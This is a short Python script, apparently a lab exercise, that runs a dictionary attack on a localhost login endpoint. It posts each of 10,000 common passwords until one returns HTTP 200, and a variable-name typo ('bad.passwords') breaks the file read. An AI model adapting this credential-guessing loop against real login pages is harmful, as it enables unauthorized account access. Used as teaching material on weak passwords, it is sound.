import requests
def try_password(password, print_all=False):
    # specify where to make the request
    url = 'http://127.0.0.1:5000/login'
    # define the payload for the post request
    payload = {'password': password}
    # make the request
    r = requests.post(url, json=payload)
    # print some results (http status code)
    if print_all:
        print(payload['password'] + ";" + str(r.status_code))
    # determine if we've gained access 200 = success!
    if r.status_code == 200:
        print("the password is: " + payload['password'])
        return True
    else:
        return False
# Usage of the above function
try_password('kitten')
# Load the NIST list of 10,000 most commonly used passwords (strings)
with open('nist_10000.txt', newline='') as bad_passwords:
    nist_bad = bad.passwords.read().split('\n')
# print(nist_bad[1:10])
for password in nist_bad:
    success = try_password(password)
    if success:
        break
else:
    print('No password in NIST is matched.')
